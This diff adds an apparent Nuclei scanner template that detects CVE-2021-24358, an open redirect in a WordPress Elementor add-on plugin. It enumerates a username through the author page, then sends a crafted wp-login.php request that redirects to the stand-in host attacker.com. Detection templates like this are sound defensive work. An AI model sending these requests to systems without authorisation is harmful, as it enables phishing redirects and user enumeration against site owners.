@@ -1,0 +1,53 @@
+id: elementorpage-open-redirect
+
+info:
+  name: Plus Addons for Elementor Page Builder < 4.1.10 - Open Redirect
+  author: dhiyaneshDk
+  severity: medium
+  description: WordPress Plus Addons for Elementor Page Builder before 4.1.10 did not validate a redirect parameter on a specifically crafted URL before redirecting the user to it, leading to an open redirect issue.
+  reference:
+    - https://wpscan.com/vulnerability/fd4352ad-dae0-4404-94d1-11083cb1f44d
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-24358
+    - https://theplusaddons.com/changelog/
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 6.1
+    cve-id: CVE-2021-24358
+    cwe-id: CWE-601
+  tags: wordpress,redirect,wp-plugin,elementor,wp
+
+requests:
+  - raw:
+      - |
+        GET /?author=1 HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /wp-login.php?action=theplusrp&key=&redirecturl=http://attacker.com&forgoturl=http://attacker.com&login={{username}} HTTP/1.1
+        Host: {{Hostname}}
+
+    redirects: true
+    matchers:
+      - type: regex
+        part: header
+        regex:
+          - '(?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]*)attacker\.com\/?(\/|[^.].*)?$' # https://regex101.com/r/ZDYhFh/1
+
+    extractors:
+      - type: regex
+        part: body
+        name: username
+        internal: true
+        group: 1
+        regex:
+          - 'Author:(?:[A-Za-z0-9 -\_="]+)?<span(?:[A-Za-z0-9 -\_="]+)?>([A-Za-z0-9]+)<\/span>'
+
+      - type: regex
+        part: header
+        name: username
+        internal: true
+        group: 1
+        regex:
+          - 'ion: https:\/\/[a-z0-9.]+\/author\/([a-z]+)\/'
+
+# Enhanced by mp on 2022/04/13
